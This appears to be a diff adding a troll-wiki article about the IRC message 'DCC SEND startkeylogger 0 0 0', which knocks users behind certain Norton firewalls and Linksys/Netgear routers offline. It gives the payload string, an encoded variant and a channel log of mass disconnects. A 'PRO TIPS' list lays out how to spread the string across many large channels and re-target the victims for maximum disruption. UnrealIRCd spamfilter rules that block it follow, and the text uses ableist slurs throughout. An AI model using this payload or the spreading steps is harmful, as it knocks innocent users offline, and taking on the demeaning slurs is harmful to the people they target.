@@ -1,0 +1,78 @@
+DCC SEND startkeylogger 0 0 0
+The phrase '''DCC SEND startkeylogger 0 0 0''' <s>is</s> was (Norton fixed it, although some people are still vulnerable because they are fucktards) frequently used by [[H4x0r]]s on [[IRC]] to make Norton and some retarded Linksys / Netgear routers [[Scat|shit on the connection]]. It had highly [[E-drama|dramatic effects]], causing pricks who use Norton or shitty Linksys / Netgear routers to drop off the face of the [[internets]], often flooding the channel with spam. It only needs to be DCC SEND (14+ chrs) See: [http://www.hm2k.com/articles/startkeylogger/ startkeylogger]
+==Example==
+This is what it looks like when a [[H4x0r]] unleashes his vagina powers upon the IRC channel:
+<pre>
+[15:07:44] <Fail-chan> DCC SEND "startkeylogger" 0 0 0
+[15:07:44] * oneszero has quit (Read error: Connection reset by peer)
+[15:07:44] * billspork has quit (Read error: Connection reset by peer)
+[15:07:44] * cynistyr- has quit (Read error: Connection reset by peer)
+[15:07:44] * AudioVENT has quit (Read error: Connection reset by peer)
+[15:07:44] * mikel has quit (Read error: Connection reset by peer)
+[15:07:44] * Crispy` has quit (Read error: Connection reset by peer)
+[15:07:44] * ste_ has quit (Read error: Connection reset by peer)
+[15:07:44] * tzennator has quit (Read error 54: Connection reset by peer)
+[15:07:44] * Short has quit (Read error: Connection reset by peer)
+[15:07:44] * RedXIII has quit (Read error: Connection reset by peer)
+[15:07:44] * Urkav has quit (Read error: Connection reset by peer)
+[15:07:44] * mflynn00 has quit (Read error: Connection reset by peer)
+[15:07:44] * SicdoggV has quit (Read error: Connection reset by peer)
+[15:07:45] * HyPn0m0D has quit (Read error: Connection reset by peer)
+[15:07:45] * lonequid has quit (Read error: Connection reset by peer)
+[15:07:45] * MytSouriS has quit (Read error: Connection reset by peer)
+[15:07:45] * Furious_G has quit (Read error: Connection reset by peer)
+[15:07:45] * ChunkeyMo has quit (Read error: Connection reset by peer)
+[15:07:45] * Antizac has quit (Read error: Operation timed out)
+</pre>
+
+You can also encode things between the "s to effect more people. Posted below, but not shown correctly due to wiki fail.  
+
+<pre>??�DCC SEND "ff???f?ð‘¹ð‘°ð‘·ð‘³ð‘¶ð‘³ð‘ºð‘¼ð‘·ð‘®ð‘¼ð’€ð‘º" 0 0 0</pre>
+==PRO TIPS==
+To maximize the drama, follow these steps:
+
+#Connect to an IRC Network
+#/list all Channels with more than 50 members and join all of them
+#/amsg DCC SEND startkeylogger 0 0 0 or any other command that causes your client to send a message to all channels
+#You will probably get kicked from most chans. Write down the nicks of those who got pwnt.
+#Convert these names into a script that sends each of them message, containing the evil words
+#Give them some time to reconnect, then execute your script
+#Execute previous step until you get banned from the network.
+#???
+#PROFIT
+
+Alternatively you can make this your wireless network id to annoy people within your general vicinity.
+
+==[[Lulzkiller|Filtering this from your network]]==
+I've thrown together some quick and dirty UnrealIRCd spamfilter commands to help deal with these exploits.  Refinements and improvements welcome!
+
+<pre>
+/spamfilter + cpnNPqat block - norton_firewall_exploit startkeylogger
+/spamfilter + cpnNPqat block - norton_firewall_exploit stopkeylogger
+/spamfilter + cpNPqat block - linksys_netgear_exploit ^DCC SEND ..............
+</pre>
+(The last one has 14 dots at the end of the pattern.)
+
+If you want to add these to your config file, use
+<pre>
+spamfilter {
+  regex "^DCC SEND ..............";
+  target { channel; private; private-notice; part; quit; away; topic; };
+  action block;
+  reason "linksys netgear exploit";
+};
+spamfilter {
+  regex "startkeylogger";
+  target { channel; private; private-notice; part; quit; away; topic; private-notice; };
+  action block;
+  reason "norton firewall exploit";
+};
+</pre>
+
+==External Links==
+*[http://www.hm2k.com/articles/startkeylogger "explains it better"]
+
+{{Trolls}}
+{{ircseries}}
+[[Category:Pranks]]
+[[Category:Drama-generating techniques]]
